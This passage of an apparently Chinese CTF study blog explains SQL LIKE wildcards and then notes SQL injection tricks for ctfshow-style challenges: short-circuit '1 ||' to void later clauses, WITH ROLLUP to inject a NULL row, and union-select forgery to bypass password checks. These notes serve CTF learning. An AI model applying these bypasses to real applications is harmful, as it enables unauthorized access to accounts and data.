-<h2 id="Episode-6-模糊匹配"><a href="#Episode-6-模糊匹配" class="headerlink" title="Episode 6  模糊匹配"></a>Episode 6  模糊匹配</h2><p>SQL模糊查询，使用like比较关键字，加上SQL里的通配符，请参考以下：</p>
-<p>1、LIKE’Mc%’ 将搜索以字母 Mc 开头的所有字符串（如 McBadden）。</p>
-<p>2、LIKE’%inger’ 将搜索以字母 inger 结尾的所有字符串（如 Ringer、Stringer）</p>
-<p>3、LIKE’%en%’ 将搜索在任何位置包含字母 en 的所有字符串（如 Bennet、Green、McBadden）。</p>
-<p>4、LIKE’_heryl’ 将搜索以字母 heryl 结尾的所有六个字母的名称（如 Cheryl、Sheryl）。</p>
-<p>5、LIKE’[CK]ars[eo]n’ 将搜索下列字符串：Carsen、Karsen、Carson 和 Karson（如 Carson）。</p>
-<p>6、LIKE’[M-Z]inger’ 将搜索以字符串 inger 结尾、以从 M 到 Z 的任何单个字母开头的所有名称（如 Ringer）。</p>
-<p>7、LIKE’M[^c]%’ 将搜索以字母 M 开头，并且第二个字母不是 c 的所有名称（如MacFeather）。</p>
-<h2 id="Episode-7-奇奇怪怪的知识点积累"><a href="#Episode-7-奇奇怪怪的知识点积累" class="headerlink" title="Episode   7 奇奇怪怪的知识点积累"></a>Episode   7 奇奇怪怪的知识点积累</h2><p><strong>短路算法：</strong></p>
-<p>|| 逻辑或的短路：a||b</p>
-<p>计算机发现a是真，那么输出a；如果a是假，那么输出b</p>
-<p>select 1 from ：建立一个临时列，这个列的所有初始值都被设为1。如果发现select后面跟有||就可以构造1 ||(sql语句) 用来无效化后方语句。</p>
-<p><strong>WITH ROLLUP:</strong>(来自ctfshow web10)</p>
-<pre><code class="highlight plaintext">语法:group by xxx with rollup</code></pre>
-
-<p>with rollup是对前面数据的一次汇总，此时在查询的数据中会被插入一行值为NULL,此时即可绕过长度检验，前提你要知道在哪个表并且没有对第二个字段是否输入的前端检查</p>
-<p><strong>联合查询伪造</strong></p>
-<p>通过联合查询，你可以伪造一段没有的数据(即临时数据)</p>
-<p>因为union select会把查询结果接在前一个查询结果后面，前面如果查到了东西，那么取得还是第一行</p>
-<p>那么通过让前面查不到，回显我们的注入语句就能够达到注入目的(呃呃，感觉有点像二次注入的后面半段)</p>
-<p>这里直接应用别的师傅打好的案例</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250330124245041.png" alt="image-20250330124245041"></p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250330124258559.png" alt="image-20250330124258559"></p>
-<p>那么只要知道username所在的列就可以直接糊弄过密码的检测了</p>
-<h2 id="Episode-8-一点感想"><a href="#Episode-8-一点感想" class="headerlink" title="Episode   8 一点感想"></a>Episode   8 一点感想</h2><p>刷了一些题目，发现最重要的其实是注入点的判断(除非是万恶的盲注，那重点可能更在脚本上)</p>
-<p>[参考文章]: <a href="https://www.cnblogs.com/ECJTUACM-873284962/p/8977983.html">https://www.cnblogs.com/ECJTUACM-873284962/p/8977983.html</a>	“基于约束的SQL攻击 - Angel_Kitty - 博客园”<br>[参考文章]: <a href="https://www.cnblogs.com/icui4cu/p/15136893.html">https://www.cnblogs.com/icui4cu/p/15136893.html</a>	“宽字节注入原理及绕过方式”</p>
-]]></content>
-      <tags>
-        <tag>-web -CTF</tag>
       </tags>
   </entry>
 </search>
